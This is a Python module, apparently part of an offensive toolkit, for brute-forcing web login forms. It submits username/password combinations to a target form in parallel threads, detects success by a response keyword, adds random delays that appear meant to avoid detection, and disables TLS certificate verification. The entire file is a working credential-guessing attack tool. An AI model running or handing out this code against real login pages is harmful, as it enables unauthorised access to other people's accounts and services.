# Author: FAZ-28 
# Description: module for brute force http
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
import random
import logging

class BruteForceHTTP:
    def __init__(self, form_url, combo_list=[], username_field='username', password_field='password',
                 success_keyword=None, max_workers=10, max_errors=10):
        self.info = "HTTP brute force module (form-based)"
        self.form_url = form_url
        self.combos = combo_list
        self.username_field = username_field
        self.password_field = password_field
        self.success_keyword = success_keyword  # string yang menunjukkan login berhasil
        self.max_workers = max_workers
        self.max_errors = max_errors
        self.lock = threading.Lock()
        self.found = False
        self.valid_cred = None
        self.error_count = 0

    def attempt_login(self, username, password):
        if self.found or self.error_count >= self.max_errors:
            return None

        time.sleep(random.uniform(0.2, 0.8))

        try:
            data = {
                self.username_field: username,
                self.password_field: password
            }

            response = requests.post(self.form_url, data=data, timeout=5, verify=False)

            if self.success_keyword and self.success_keyword.lower() in response.text.lower():
                with self.lock:
                    if not self.found:
                        self.found = True
                        self.valid_cred = (username, password)
                        logging.debug(f"Valid HTTP login found: {username}:{password}")
                return (username, password)

        except Exception as e:
            with self.lock:
                self.error_count += 1
            logging.debug(f"Error during HTTP login {username}:{password} - {str(e)}")
            return None

        return None

    def run(self):
        if not self.success_keyword:
            logging.warning("No success_keyword provided, cannot determine successful login.")
            return None

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.attempt_login, u, p) for u, p in self.combos]

            for future in as_completed(futures):
                if self.found or self.error_count >= self.max_errors:
                    break

        return self.valid_cred if self.valid_cred else None
